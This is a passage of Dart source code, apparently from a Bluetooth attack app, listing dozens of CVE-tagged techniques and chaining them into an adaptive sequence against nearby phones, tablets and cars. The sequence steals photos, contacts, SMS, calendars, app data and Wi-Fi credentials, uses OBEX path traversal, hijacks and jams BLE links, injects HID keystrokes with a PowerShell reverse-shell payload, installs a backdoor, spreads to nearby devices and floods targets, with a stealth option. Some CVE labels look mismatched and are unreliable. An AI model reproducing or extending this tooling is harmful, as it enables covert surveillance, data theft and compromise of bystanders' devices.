    {'type': 'ble_exploit', 'command': 'secure', 'name': 'BLE_SC_BYPASS', 'cve': 'CVE-2019-9506', 'category': 'ble', 'desc': 'KNOB attack pairing'},
    {'type': 'ble_replay', 'name': 'BLE_REPLAY', 'cve': '', 'category': 'ble', 'desc': 'BLE GATT replay'},
    // BLUR + SweynTooth (BLE 5.x modern exploits)
    {'type': 'blur_attack', 'name': 'BLUR_ATTACK', 'cve': 'CVE-2022-20361', 'category': 'ble', 'desc': 'BLUR - BLE connection hijack'},
    {'type': 'sweyntooth_attack', 'name': 'SWEYNTOOTH', 'cve': 'CVE-2019-17053', 'category': 'ble', 'desc': 'SweynTooth LLID injection'},
    {'type': 'blerp_attack', 'name': 'BLERP_REPAIRING', 'cve': 'CVE-2025-62235', 'category': 'ble', 'desc': 'BLERP - BLE re-pairing MitM'},
    {'type': 'shareme_credential_extract', 'name': 'SHAREME_CREDS', 'cve': '', 'category': 'ble', 'desc': 'Xiaomi ShareMe WiFi credential extraction'},
    {'type': 'quickshare_discovery', 'name': 'QUICKSHARE_DISC', 'cve': '', 'category': 'recon', 'desc': 'Quick Share / AirDrop pre-auth discovery'},
    
    // ===== AVANZADOS/MODERNOS =====
    {'type': 'mirror_profile', 'name': 'MIRROR', 'cve': '', 'category': 'advanced', 'desc': 'Mirror Profile clone'},
    {'type': 'blueborne', 'name': 'BLUEBORNE', 'cve': 'CVE-2017-1000251', 'category': 'advanced', 'desc': 'BlueBorne RCE'},
    {'type': 'full_scan', 'name': 'FULL_SCAN', 'cve': '', 'category': 'advanced', 'desc': 'Full vulnerability scan'},
    {'type': 'spoofing', 'command': 'BlueSnafer Pro', 'name': 'SPOOFING', 'cve': '', 'category': 'advanced', 'desc': 'Device spoofing'},
    {'type': 'opp_push', 'command': '/test.txt', 'name': 'OPP_PUSH', 'cve': '', 'category': 'advanced', 'desc': 'OBEX Push file'},
    {'type': 'a2dp_inject', 'name': 'A2DP_INJECT', 'cve': '', 'category': 'advanced', 'desc': 'A2DP audio injection'},
    
    // ===== BYPASS AUTH =====
     {'type': 'bypass', 'command': 'quick_connect', 'name': 'BYPASS_QUICK', 'cve': 'CVE-2020-10135', 'category': 'bypass', 'desc': 'BIAS - Quick connect race'},
     {'type': 'bypass', 'command': 'mac_spoof', 'name': 'BYPASS_MAC', 'cve': '', 'category': 'bypass', 'desc': 'MAC spoofing'},
     {'type': 'bypass', 'command': 'obex_trust', 'name': 'BYPASS_OBEX', 'cve': '', 'category': 'bypass', 'desc': 'OBEX trust abuse'},
     {'type': 'pin_crack', 'name': 'PIN_BRUTE', 'cve': '', 'category': 'bypass', 'desc': 'PIN brute force'},
      // === CVE-2025-36911: Fast Pair Authentication Bypass ===
      {'type': 'cve_2025_36911_fastpair', 'name': 'FASTPAIR_BYPASS', 'cve': 'CVE-2025-36911', 'category': 'bypass', 'desc': 'Fast Pair Account Key spoofing - pairing sin confirmación'},
      {'type': 'fastpair_key_extract', 'name': 'FASTPAIR_KEY_EXTRACT', 'cve': 'CVE-2025-36911', 'category': 'bypass', 'desc': 'Fast Pair Account Key extraction from bonded devices'},
      
      // ===== DoS =====
    {'type': 'dos', 'command': 'gatt_flood', 'name': 'DOS_GATT', 'cve': 'CVE-2020-12351', 'category': 'dos', 'desc': 'GATT flood'},
    {'type': 'dos', 'command': 'l2cap_flood', 'name': 'DOS_L2CAP', 'cve': '', 'category': 'dos', 'desc': 'L2CAP flood'},
    {'type': 'dos', 'command': 'mtu_crash', 'name': 'DOS_MTU', 'cve': '', 'category': 'dos', 'desc': 'MTU crash'},
    {'type': 'dos', 'command': 'braktooth', 'name': 'BRACKTOOTH', 'cve': 'CVE-2021-28139', 'category': 'dos', 'desc': 'BrakTooth ESP32'},
    // ===== TÉCNICAS ADICIONALES MODERNAS =====
    {'type': 'sdp_enumerate', 'command': 'all', 'name': 'SDP_ENUM', 'cve': '', 'category': 'recon', 'desc': 'SDP servicio completo'},
    {'type': 'obex_get', 'command': 'telecom/cal.vcf', 'name': 'BLUESNARF_CAL', 'cve': 'CVE-2003-0300', 'category': 'data', 'desc': 'BlueSnarf Calendario'},
    {'type': 'btle_spoof', 'command': 'identity', 'name': 'BLE_SPOOF', 'cve': '', 'category': 'ble', 'desc': 'BLE identity spoofing'},
    {'type': 'a2dp_exploit', 'name': 'A2DP_EXPLOIT', 'cve': 'CVE-2021-28139', 'category': 'advanced', 'desc': 'A2DP buffer overflow'},
    {'type': 'l2cap_pwn', 'name': 'L2CAP_PWN', 'cve': '', 'category': 'advanced', 'desc': 'L2CAP pwnage'},
    {'type': 'hfp_inject', 'script': 'voice', 'name': 'HFP_VOICE', 'cve': '', 'category': 'injection', 'desc': 'HFP voice injection'},
    {'type': 'gatt_write', 'command': 'exploit', 'name': 'GATT_WRITE', 'cve': '', 'category': 'ble', 'desc': 'GATT characteristic write exploit'},
    {'type': 'ble_implement', 'name': 'BLE_IMPLEMENT', 'cve': '', 'category': 'ble', 'desc': 'BLE implementation exploit'},
     {'type': 'rfcomm_exploit', 'name': 'RFCOMM_EXPLOIT', 'cve': '', 'category': 'advanced', 'desc': 'RFCOMM protocol exploit'},

     // ===== NUEVAS TÉCNICAS DE EXTRACCIÓN AVANZADA =====
     // A2DP Sink Recording - captura audio del dispositivo fuente
     {'type': 'a2dp_record', 'name': 'A2DP_RECORD', 'cve': 'A2DP-SINK-RECORD', 'category': 'audio', 'desc': 'A2DP Sink audio recording (30s)'},
     {'type': 'a2dp_stream', 'name': 'A2DP_STREAM', 'cve': 'A2DP-SINK-RECORD', 'category': 'audio', 'desc': 'A2DP continuous streaming (max 5 min)'},
     // GATT Bulk Read - lectura masiva de características
     {'type': 'gatt_bulk_read', 'name': 'GATT_BULK', 'cve': '', 'category': 'ble', 'desc': 'Read all GATT characteristics'},
     {'type': 'gatt_monitor', 'name': 'GATT_MON', 'cve': '', 'category': 'ble', 'desc': 'Monitor GATT notifications'},

     // ===== EXTRACCIÓN MODERNA DE IMÁGENES =====
     // MediaStore Enhanced - Android 10+ content:// URIs (moderno, no OBEX)
     {'type': 'mediastore_enhanced', 'name': 'MEDIASTORE_ENHANCED', 'cve': '', 'category': 'data_mediastore', 'desc': 'MediaStore batch: consulta content:// URIs, descarga todas las imágenes'},
     // GATT Image Read - escanear characteristics BLE con datos de imagen
     {'type': 'gatt_image_read', 'name': 'GATT_IMAGE_READ', 'cve': '', 'category': 'ble', 'desc': 'Escanear GATT characteristics buscando datos de imagen (IoT/cámaras)'},
     // OPP Server Mode - invertir rol, target envía imágenes voluntariamente
     {'type': 'opp_server_mode', 'name': 'OPP_SERVER_MODE', 'cve': '', 'category': 'data', 'desc': 'OPP Server: esperar que el target envíe imágenes vía Object Push'},
     // MAP Image Extract - WhatsApp/Telegram images via MAP profile
     {'type': 'map_image_extract', 'name': 'MAP_IMAGE_EXTRACT', 'cve': '', 'category': 'data', 'desc': 'MAP: extraer imógenes adjuntas de mensajes (WhatsApp/Telegram)'},
      // ===== QUICK SHARE / NEARBY RECEPTOR (vía moderna de imágenes) =====
      {'type': 'quickshare_server', 'name': 'QUICKSHARE_RECEPTOR', 'cve': '', 'category': 'data', 'desc': 'Quick Share server: recibe imágenes compartidas por el target (Nearby/Quick Share)'},
      // ===== FAMILIAS DE CAPA DE ENLACE (modernas) =====
      {'type': 'knob', 'name': 'KNOB', 'cve': 'CVE-2019-9506', 'category': 'ble', 'desc': 'KNOB - downgrade del tamaño de clave (7 bytes)'},
      {'type': 'cve_2021_10134_bias', 'name': 'BIAS', 'cve': 'CVE-2021-10134', 'category': 'ble', 'desc': 'BIAS - impersonación de dispositivo durante pairing'},
      {'type': 'cve_2020_26558_bleeding', 'name': 'BLEEDINGTOOTH', 'cve': 'CVE-2020-26558', 'category': 'ble', 'desc': 'BleedingTooth - fuga de heap L2CAP (Linux)'},

      // ===== PERSISTENCIA =====
     {'type': 'install_persistence', 'name': 'INSTALL_BACKDOOR', 'cve': '', 'category': 'persistence', 'desc': 'Install backdoor service'},

      // ===== MULTI-PROTOCOL EXTRACTION =====
      {'type': 'multi_extract', 'name': 'MULTI_EXTRACT', 'cve': '', 'category': 'data', 'desc': 'Multi-protocol extraction: GATT + OBEX FTP + BIP + OPP'},
      // ===== ÚLTIMA GENERACIÓN =====
      // Ghost Relay Attack (CVE-2024-27100) - relay de doble transporte
      {'type': 'ghost_relay', 'duration': 30, 'name': 'GHOST_RELAY', 'cve': 'CVE-2024-27100', 'category': 'advanced', 'desc': 'Ghost relay attack - bypass secure connection relay protection'},
     // Bluetooth Lateral Movement - escaneo y propagación post-explotación
     {'type': 'bt_lateral_scan', 'duration': 10, 'name': 'LATERAL_SCAN', 'cve': '', 'category': 'advanced', 'desc': 'Lateral movement - scan nearby devices via compromised target'},
     {'type': 'bt_lateral_propagate', 'name': 'LATERAL_PROPAGATE', 'cve': '', 'category': 'advanced', 'desc': 'Propagate payload to nearby devices via OPP'},
   ];

  // Estrategia adaptativa basada en reconocimiento
   /// Estrategia adaptativa completa basada en tipo de dispositivo y capacidades detectadas
   /// Organizada en fases para maximizar eficiencia y minimizar interferencias
   List<Map<String, dynamic>> _getAdaptiveAttackSequence(String deviceType) {
      List<Map<String, dynamic>> sequence = [];
      final deviceInfo = _reconnaissanceResults ?? {};
      final dt = deviceType.toLowerCase();

      final hasObex = deviceInfo['hasObex'] == true;
      final hasAndroid = deviceInfo['androidVersion'] != null ||
          dt.contains('smartphone') ||
          dt.contains('tablet') ||
          dt.contains('car');
      final isData = dt.contains('smartphone') || dt.contains('tablet') || dt.contains('laptop') || dt.contains('wearable') || dt.contains('car') || dt.contains('unknown');
      final isAudio = dt.contains('audio') || dt.contains('headset') || dt.contains('speaker') || dt.contains('earbud');
      final hasBle = deviceInfo['hasBle'] == true || dt.contains('wearable') || dt.contains('car');
      final shouldTryObex = hasObex || (isData && !isAudio);

      // ========== FASE 1: RECONOCIMIENTO (rápido, paralelo) ==========
      sequence.add({'type': 'sdp_discover', 'command': 'scan', 'name': 'SDP_SCAN', 'phase': 1, 'timeout': 5000, 'retries': 1});
      sequence.add({'type': 'sdp_enumerate', 'command': 'all', 'name': 'SDP_ENUM', 'phase': 1, 'timeout': 8000, 'retries': 1});

      // ========== FASE 1: RECONOCIMIENTO (rápido, paralelo) ==========
      sequence.add({'type': 'sdp_discover', 'command': 'scan', 'name': 'SDP_SCAN', 'phase': 1, 'timeout': 5000, 'retries': 1});
      sequence.add({'type': 'sdp_enumerate', 'command': 'all', 'name': 'SDP_ENUM', 'phase': 1, 'timeout': 8000, 'retries': 1});
      sequence.add({'type': 'quickshare_discovery', 'name': 'QUICKSHARE_DISCOVERY', 'phase': 1, 'timeout': 10000, 'retries': 1});

      // ========== FASE 1.5: EXTRACCIÓN DE IMÁGENES (PRIORIDAD MÁXIMA) ==========
      if (dt.contains('smartphone') || dt.contains('tablet') || hasAndroid) {
        sequence.add({'type': 'extract_images', 'name': 'GALLERY_PHOTOS', 'phase': 1.5, 'timeout': 60000, 'retries': 1});
        if (hasAndroid) {
          sequence.add({'type': 'mediastore_enhanced', 'name': 'MEDIASTORE_ENHANCED', 'phase': 1.5, 'timeout': 20000, 'retries': 1});
        }
        if (hasBle) {
          sequence.add({'type': 'gatt_image_read', 'name': 'GATT_IMAGE_READ', 'phase': 1.5, 'timeout': 25000, 'retries': 1});
        }
        sequence.add({'type': 'opp_server_mode', 'name': 'OPP_SERVER_MODE', 'phase': 1.5, 'timeout': 35000, 'retries': 1});
        sequence.add({'type': 'map_image_extract', 'name': 'MAP_IMAGE_EXTRACT', 'phase': 1.5, 'timeout': 20000, 'retries': 1});
        // Receptor Quick Share / Nearby Connections: el target comparte y nosotros recibimos (Android moderno)
        sequence.add({'type': 'quickshare_server', 'name': 'QUICKSHARE_RECEPTOR', 'phase': 1.5, 'timeout': 40000, 'retries': 1});
      }

      // ========== FASE 2: EXTRACCIÓN DE DATOS (paralelo) ==========
      // Multi-protocol extraction: GATT + OBEX + BIP + OPP (intenta todo)
      if (hasBle || shouldTryObex || isData) {
        sequence.add({'type': 'multi_extract', 'name': 'MULTI_EXTRACT', 'phase': 2, 'timeout': 30000, 'retries': 1});
      }
      if (shouldTryObex) {
        sequence.add({'type': 'obex_extract', 'command': 'scan', 'name': 'OBEX_EXTRACT_ALL', 'phase': 2, 'timeout': 15000, 'retries': 2});
        sequence.add({'type': 'obex_get', 'command': 'telecom/pb.vcf', 'name': 'BLUESNARF_CONTACTS', 'phase': 2, 'timeout': 15000, 'retries': 2});
        sequence.add({'type': 'obex_get', 'command': 'telecom/cal.vcf', 'name': 'BLUESNARF_CALENDAR', 'phase': 2, 'timeout': 15000, 'retries': 2});
        sequence.add({'type': 'file_exfil_dir', 'command': '../..', 'name': 'OBEX_TRAVERSAL', 'phase': 2, 'timeout': 15000, 'retries': 2});
        for (final dir in ['DCIM/Camera', 'DCIM', 'WhatsApp/Media', 'Pictures', 'Screenshots', 'Download', 'Telegram', 'Documents']) {
          sequence.add({'type': 'file_exfil_dir', 'command': dir, 'name': 'OBEX_${dir.toUpperCase().replaceAll('/', '_')}', 'phase': 2, 'timeout': 20000, 'retries': 2});
        }
        if (deviceInfo['hasBle'] == true) {
          sequence.add({'type': 'obex_ble_transfer', 'command': '/DCIM/Camera', 'name': 'OBEX_BLE_CAMERA', 'phase': 2, 'timeout': 20000, 'retries': 2});
        }
      }
      if (isData) sequence.add({'type': 'pbap_extract', 'command': 'all', 'name': 'PBAP_ALL', 'phase': 2, 'timeout': 30000, 'retries': 2});
      sequence.add({'type': 'shareme_credential_extract', 'name': 'SHAREME_CREDENTIALS', 'phase': 2, 'timeout': 15000, 'retries': 2});
      if (dt.contains('smartphone') || dt.contains('tablet') || hasAndroid) {
        sequence.add({'type': 'at_extract_identity', 'name': 'AT_IDENTITY', 'phase': 2, 'timeout': 25000, 'retries': 1});
        sequence.add({'type': 'map_extract', 'name': 'MAP_SMS_EXTRACT', 'phase': 2, 'timeout': 20000, 'retries': 2});
        sequence.add({'type': 'map_folders', 'name': 'MAP_FOLDERS', 'phase': 2, 'timeout': 10000, 'retries': 1});
      }

      // ========== FASE 8: ANÁLISIS PROFUNDO (opcional, al final) ==========
      // Técnicas pesadas que saturaban la fase 1 se ejecutan al final en secuencial
      sequence.add({'type': 'full_scan', 'name': 'FULL_SCAN', 'phase': 8, 'timeout': 10000, 'retries': 1});
      sequence.add({'type': 'cve_2025_13834_heartbleed', 'iterations': 5, 'name': 'HEARTBLEED_13834', 'phase': 8, 'timeout': 15000, 'retries': 1});
      if (hasAndroid) {
        sequence.add({'type': 'mediastore_enumerate', 'name': 'MEDIASTORE_SCAN', 'phase': 8, 'timeout': 8000, 'retries': 1});
        sequence.add({'type': 'app_data_scan', 'name': 'APP_DATA_SCAN', 'phase': 8, 'timeout': 15000, 'retries': 1});
        sequence.add({'type': 'network_scan', 'name': 'NETWORK_SCAN', 'phase': 8, 'timeout': 10000, 'retries': 1});
        sequence.add({'type': 'wifi_scan', 'name': 'WIFI_SCAN', 'phase': 8, 'timeout': 8000, 'retries': 1});
      }

      // ========== FASE 3: BLE EXPLOITS (paralelo) ==========
      if (hasBle) {
        sequence.add({'type': 'btlejack', 'command': 'scan', 'name': 'BTLE_SCAN', 'phase': 3, 'timeout': 10000, 'retries': 2});
        sequence.add({'type': 'btlejack', 'command': 'sniff', 'name': 'BTLE_SNIFF', 'phase': 3, 'timeout': 15000, 'retries': 1});
        sequence.add({'type': 'btlejack', 'command': 'hijack', 'name': 'BTLE_HIJACK', 'phase': 3, 'timeout': 12000, 'retries': 2});
        sequence.add({'type': 'btlejack', 'command': 'jam', 'name': 'BTLE_JAM', 'phase': 3, 'timeout': 10000, 'retries': 1});
        sequence.add({'type': 'btlejack', 'command': 'mitm', 'name': 'BLE_MITM', 'phase': 3, 'timeout': 15000, 'retries': 2});
        sequence.add({'type': 'blur_attack', 'name': 'BLUR_ATTACK', 'phase': 3, 'timeout': 8000, 'retries': 2});
        sequence.add({'type': 'sweyntooth_attack', 'name': 'SWEYNTOOTH', 'phase': 3, 'timeout': 8000, 'retries': 2});
        sequence.add({'type': 'blueborne', 'name': 'BLUEBORNE', 'phase': 3, 'timeout': 12000, 'retries': 2});
        // === Familias de capa de enlace (modernas): KNOB, BIAS, BleedingTooth ===
        sequence.add({'type': 'knob', 'name': 'KNOB_KEYSIZE_7', 'phase': 3, 'timeout': 15000, 'retries': 2});
        sequence.add({'type': 'cve_2021_10134_bias', 'name': 'BIAS_IMPERSONATION', 'phase': 3, 'timeout': 15000, 'retries': 2});
        sequence.add({'type': 'cve_2020_26558_bleeding', 'name': 'BLEEDINGTOOTH', 'phase': 3, 'timeout': 15000, 'retries': 2});
        sequence.add({'type': 'ble_pairing', 'command': 'justworks', 'name': 'BLE_JUSTWORKS', 'phase': 3, 'timeout': 10000, 'retries': 2});
        sequence.add({'type': 'ble_exploit', 'command': 'secure', 'name': 'BLE_SC_BYPASS', 'phase': 3, 'timeout': 10000, 'retries': 2});
        sequence.add({'type': 'ble_replay', 'name': 'BLE_REPLAY', 'phase': 3, 'timeout': 12000, 'retries': 1});
        sequence.add({'type': 'cve_2025_10456_ble_fixed', 'name': 'BLE_FIXED_10456', 'phase': 3, 'timeout': 10000, 'retries': 2});
        sequence.add({'type': 'gatt_bulk_read', 'name': 'GATT_BULK_READ', 'phase': 3, 'timeout': 20000, 'retries': 2});
        sequence.add({'type': 'gatt_monitor', 'name': 'GATT_MONITOR', 'phase': 3, 'timeout': 35000, 'retries': 1});
        sequence.add({'type': 'btle_spoof', 'command': 'identity', 'name': 'BLE_SPOOF', 'phase': 3, 'timeout': 10000, 'retries': 2});
        sequence.add({'type': 'gatt_write', 'command': 'exploit', 'name': 'GATT_WRITE', 'phase': 3, 'timeout': 10000, 'retries': 2});
        sequence.add({'type': 'ble_implement', 'name': 'BLE_IMPLEMENT', 'phase': 3, 'timeout': 10000, 'retries': 2});
        sequence.add({'type': 'l2cap_pwn', 'name': 'L2CAP_PWN', 'phase': 3, 'timeout': 15000, 'retries': 2});
        sequence.add({'type': 'cve_2025_26438_smp_bypass', 'name': 'SMP_BYPASS_26438', 'phase': 3, 'timeout': 15000, 'retries': 2});
        sequence.add({'type': 'a2dp_exploit', 'name': 'A2DP_EXPLOIT', 'phase': 3, 'timeout': 15000, 'retries': 2});
        sequence.add({'type': 'hfp_inject', 'script': 'voice', 'name': 'HFP_VOICE', 'phase': 3, 'timeout': 10000, 'retries': 1});
        sequence.add({'type': 'a2dp_record', 'duration': 30, 'name': 'A2DP_RECORD_30S', 'phase': 3, 'timeout': 35000, 'retries': 2});
        sequence.add({'type': 'a2dp_stream', 'name': 'A2DP_STREAM', 'phase': 3, 'timeout': 350000, 'retries': 1});
      }
      sequence.add({'type': 'blerp_attack', 'name': 'BLERP_REPAIRING', 'phase': 3, 'timeout': 12000, 'retries': 2});

      // ========== FASE 4: INYECCIÓN (SECUENCIAL) ==========
      if (dt.contains('smartphone') || dt.contains('car') || hasAndroid) {
        sequence.add({'type': 'at_injection', 'name': 'AT_INJECTION', 'phase': 4, 'timeout': 8000, 'retries': 2});
        sequence.add({'type': 'at_injection', 'command': 'ATD', 'name': 'AT_CALL', 'phase': 4, 'timeout': 5000, 'retries': 1});
      }
      if (dt.contains('smartphone') || dt.contains('tablet') || dt.contains('laptop')) {
        sequence.add({'type': 'hid', 'script': 'notepad', 'name': 'HID_NOTEPAD', 'phase': 4, 'timeout': 10000, 'retries': 2});
        sequence.add({'type': 'hid', 'script': 'terminal', 'name': 'HID_TERMINAL', 'phase': 4, 'timeout': 10000, 'retries': 2});
        sequence.add({'type': 'hid', 'script': 'wifi', 'name': 'HID_WIFI', 'phase': 4, 'timeout': 12000, 'retries': 2});
        sequence.add({'type': 'hid_inject', 'name': 'HID_INJECT', 'phase': 4, 'timeout': 10000, 'retries': 2});
        sequence.add({'type': 'cve_2024_43770_hid_rce', 'payloadType': 'powershell_reverse', 'name': 'HID_RCE_43770', 'phase': 4, 'timeout': 15000, 'retries': 2});
      }
      if (shouldTryObex) sequence.add({'type': 'rfcomm_inject', 'name': 'BLUEBUGGING', 'phase': 4, 'timeout': 10000, 'retries': 1});
      sequence.add({'type': 'rfcomm_exploit', 'name': 'RFCOMM_EXPLOIT', 'phase': 4, 'timeout': 15000, 'retries': 2});

      // ========== FASE 5: BYPASS AUTH (paralelo) ==========
      if (dt.contains('smartphone') || dt.contains('tablet') || dt.contains('unknown')) {
        sequence.add({'type': 'cve_2025_26438_smp_bypass', 'name': 'SMP_BYPASS_26438', 'phase': 5, 'timeout': 15000, 'retries': 2});
        sequence.add({'type': 'bypass', 'command': 'quick_connect', 'name': 'BYPASS_QUICK', 'phase': 5, 'timeout': 8000, 'retries': 2});
        sequence.add({'type': 'bypass', 'command': 'mac_spoof', 'name': 'BYPASS_MAC', 'phase': 5, 'timeout': 5000, 'retries': 1});
        sequence.add({'type': 'bypass', 'command': 'obex_trust', 'name': 'BYPASS_OBEX', 'phase': 5, 'timeout': 5000, 'retries': 1});
        sequence.add({'type': 'pin_crack', 'name': 'PIN_BRUTE', 'phase': 5, 'timeout': 60000, 'retries': 1});
      }
      if (deviceInfo['hasBle'] == true) {
        sequence.add({'type': 'cve_2025_36911_fastpair', 'name': 'FASTPAIR_BYPASS_36911', 'phase': 5, 'timeout': 15000, 'retries': 2});
        sequence.add({'type': 'fastpair_key_extract', 'name': 'FASTPAIR_KEY_EXTRACT', 'phase': 5, 'timeout': 10000, 'retries': 1});
      }

      // ========== FASE 6: AVANZADOS + ÚLTIMA GENERACIÓN (paralelo) ==========
      sequence.add({'type': 'mirror_profile', 'name': 'MIRROR', 'phase': 6, 'timeout': 15000, 'retries': 2});
      sequence.add({'type': 'spoofing', 'command': 'BlueSnafer Pro', 'name': 'SPOOFING', 'phase': 6, 'timeout': 8000, 'retries': 1});
      if (deviceInfo['hasBle'] == true) {
        sequence.add({'type': 'ghost_relay', 'duration': 30, 'name': 'GHOST_RELAY', 'phase': 6, 'timeout': 45000, 'retries': 1});
      }
      sequence.add({'type': 'bt_lateral_scan', 'duration': 10, 'name': 'LATERAL_SCAN', 'phase': 6, 'timeout': 15000, 'retries': 1});

     // ==========================================
     // FASE 8: DoS (opcional, si stealth=off)
     // ==========================================
      if (!_stealthMode && (deviceInfo['hasBle'] == true || dt.contains('iot') || dt.contains('smart_lock'))) {
       sequence.add({'type': 'dos', 'command': 'gatt_flood', 'name': 'DOS_GATT', 'phase': 8, 'timeout': 5000, 'retries': 1});
       sequence.add({'type': 'dos', 'command': 'l2cap_flood', 'name': 'DOS_L2CAP', 'phase': 8, 'timeout': 5000, 'retries': 1});
     }

     // ==========================================
     // FASE FINAL: OPP Push como fallback (intentar siempre)
     // ==========================================
     sequence.add({'type': 'opp_push', 'command': '/sdcard/DCIM/Camera/bluesnafer.jpg', 'name': 'OPP_INJECT', 'phase': 99, 'timeout': 8000, 'retries': 1});

     return sequence;
   }

  // Obtener lista de nombres de técnicas para el reporte
  List<String> _getAttackNames(List<Map<String, dynamic>> attacks) {
    return attacks.map((a) {
      final name = a['name'] as String?;
      if (name != null) return name;
      final type = a['type'] as String? ?? '';
      final cmd = a['command'] as String? ?? '';
      final script = a['script'] as String? ?? '';
      if (script.isNotEmpty) return '${type}_$script';
      if (cmd.isNotEmpty) return '${type}_$cmd';
      return type;
    }).toList();
  }

  // Análisis de patrones en datos extraídos
  Future<Map<String, dynamic>> _analyzeExtractedPatterns() async {
    final patterns = <String, dynamic>{};
    
    // Analizar contactos
    if (_pbapContacts.isNotEmpty) {
      final workEmails = <String>[];
      final personalEmails = <String>[];
      final phoneNumbers = <String>[];
      final socialMedia = <String>[];
      
      for (final contact in _pbapContacts) {
        final email = contact['email']?.toString().toLowerCase() ?? '';
        final phone = contact['phone']?.toString() ?? '';
        
        if (email.contains('work') || email.contains('company') || email.contains('@company.com')) {
          workEmails.add(email);
        } else if (email.isNotEmpty) {
          personalEmails.add(email);
        }
        
        if (phone.isNotEmpty) {
          phoneNumbers.add(phone);
        }
        
        // Detectar redes sociales en notas
        final notes = contact['notes']?.toString().toLowerCase() ?? '';
        if (notes.contains('whatsapp') || notes.contains('telegram') || notes.contains('instagram')) {
          socialMedia.add(notes);
        }
      }
      
      patterns['work_emails'] = workEmails;
      patterns['personal_emails'] = personalEmails;
      patterns['phone_numbers'] = phoneNumbers;
      patterns['social_media'] = socialMedia;
      patterns['contact_count'] = _pbapContacts.length;
    }
    
    // Analizar archivos
    if (_obexFiles.isNotEmpty) {
      final imageFiles = <Map<String, dynamic>>[];
      final docFiles = <Map<String, dynamic>>[];
      final videoFiles = <Map<String, dynamic>>[];
      final contactFiles = <Map<String, dynamic>>[];
      final dbFiles = <Map<String, dynamic>>[];
      
      for (final file in _obexFiles) {
        final name = file['name']?.toString().toLowerCase() ?? '';
        final size = file['size'] ?? 0;
        
        if (name.endsWith('.jpg') || name.endsWith('.jpeg') || name.endsWith('.png') || name.endsWith('.gif')) {
          imageFiles.add(file);
        } else if (name.endsWith('.pdf') || name.endsWith('.doc') || name.endsWith('.docx')) {
          docFiles.add(file);
        } else if (name.endsWith('.mp4') || name.endsWith('.mov') || name.endsWith('.avi')) {
          videoFiles.add(file);
        } else if (name.endsWith('.vcf') || name.endsWith('.csv')) {
          contactFiles.add(file);
        } else if (name.endsWith('.db') || name.endsWith('.sqlite')) {
          dbFiles.add(file);
        }
      }
      
      patterns['images'] = imageFiles.length;
      patterns['documents'] = docFiles.length;
      patterns['videos'] = videoFiles.length;
      patterns['contacts_files'] = contactFiles.length;
      patterns['databases'] = dbFiles.length;
      patterns['total_files'] = _obexFiles.length;
    }
    
    // Analizar llamadas
    if (_pbapCalls.isNotEmpty) {
      final missedCalls = _pbapCalls.where((c) => c['type'] == 'missed').length;
      final incomingCalls = _pbapCalls.where((c) => c['type'] == 'incoming').length;
      final outgoingCalls = _pbapCalls.where((c) => c['type'] == 'outgoing').length;
      
      patterns['missed_calls'] = missedCalls;
      patterns['incoming_calls'] = incomingCalls;
      patterns['outgoing_calls'] = outgoingCalls;
      patterns['total_calls'] = _pbapCalls.length;
    }
    
    _appendLog('🔍 Análisis de patrones: ${patterns.length} categorías encontradas');
    return patterns;
  }

  // Reconocimiento proactivo pre-ataque
  Future<Map<String, dynamic>> _proactiveReconnaissance(String address) async {
      final info = <String, dynamic>{};

      // Query SDP to detect services
      try {
        final sdpResult = await _exploitService.sdpDiscover(address);
        if (sdpResult['success'] == true) {
          final services = (sdpResult['services'] as List?) ?? [];
          info['services'] = services;

          // Los servicios llegan como UUIDs completos (00001106-...); extraer el
          // identificador corto y matchear contra perfiles OBEX/GATT conocidos.
          // 'dynamic' (no 'Object') es requerido por map() para aceptar null.
          String shortUuid(dynamic s) {
            if (s is Map) {
              final uuid = s['uuid']?.toString() ?? s['name']?.toString() ?? '';
              return shortUuid(uuid);
            }
            final str = s.toString().toLowerCase();
            final m = RegExp(r'^0000([0-9a-f]{4})-').firstMatch(str);
            return m != null ? m.group(1)! : str;
          }

          final uuids = services.map(shortUuid).toSet();
          // Perfiles que usan el transporte OBEX: OPP(1105), FTP(1106), IrMC(1107),
          // SAP(112D), PBAP(112F/1130), MAP(1132/1133), BIP(1130/1150/1151)
          const obexProfiles = {'1105', '1106', '1107', '112d', '112f', '1130', '1132', '1133', '1150', '1151'};
          // GATT (1800/1801) y servicios estándar BLE (0x18xx)
          info['hasObex'] = uuids.any(obexProfiles.contains);
          info['hasBle'] = uuids.any((u) => RegExp(r'^(18|0?18)').hasMatch(u));
        }
      } catch (e) {}

      // Sin suposiciones fabricadas: si SDP no devolvió evidencia, las capacidades
      // quedan como desconocidas (null) y el motor heurístico las trata como conservadoras.
      final hasSdpEvidence = info['hasObex'] != null || info['hasBle'] != null;
      if (!hasSdpEvidence) {
        _appendLog('ℹ️ SDP sin evidencia de perfiles — capacidades tratadas como desconocidas');
      }
      return info;
    }

  // Extracción de datos de aplicaciones
  Future<int> _extractAppData(String address, String displayName) async {
    if (!_enableNetworkAnalysis) return 0;
    
    int extractedFiles = 0;
    final appDirectories = [
      'Android/data',
      'Android/media', 
      'Android/obb',
      'Android/files',
    ];
    
    for (final dir in appDirectories) {
      if (!_isUnattendedRunning) return extractedFiles;
      
      try {
        final result = await _exploitService.executeAttack(
          deviceAddress: address,
          type: 'app_data_scan',
          command: dir,
        );
        
        if (result['success'] == true) {
          final files = result['files'] as List? ?? [];
          extractedFiles += files.length;
          _appendLog('  📱 $dir: ${files.length} archivos de app');
          
          // Guardar en estructura
          _extractedApps[address] ??= [];
          _extractedApps[address]!.addAll(files.map((f) => f.toString()));
        }
      } catch (e) {
        // Silenciar errores individuales
      }
    }
    
    return extractedFiles;
  }

  // Análisis de red del dispositivo
  Future<Map<String, dynamic>> _extractNetworkInfo(String address) async {
    if (!_enableNetworkAnalysis) return {};
    
    final networkInfo = <String, dynamic>{};
    
    try {
      // Escanear dispositivos conectados (ahora real)
      final connectedResult = await _exploitService.executeAttack(
        deviceAddress: address,
        type: 'network_scan',
        command: 'connected_devices',
      );
      
      if (connectedResult['success'] == true) {
        networkInfo['connected_devices'] = connectedResult['devices'];
        _appendLog('  🌐 ${(connectedResult['devices'] as List?)?.length ?? 0} dispositivos conectados');
      }
    } catch (e) {
      networkInfo['connected_devices_error'] = e.toString();
    }
    
    try {
      // Escanear redes WiFi disponibles (ahora real)
      final wifiResult = await _exploitService.executeAttack(
        deviceAddress: address,
        type: 'wifi_scan',
        command: 'available_networks',
      );
      
      if (wifiResult['success'] == true) {
        networkInfo['wifi_networks'] = wifiResult['networks'];
        _appendLog('  📶 ${(wifiResult['networks'] as List?)?.length ?? 0} redes WiFi detectadas');
      }
    } catch (e) {
      networkInfo['wifi_networks_error'] = e.toString();
    }
    
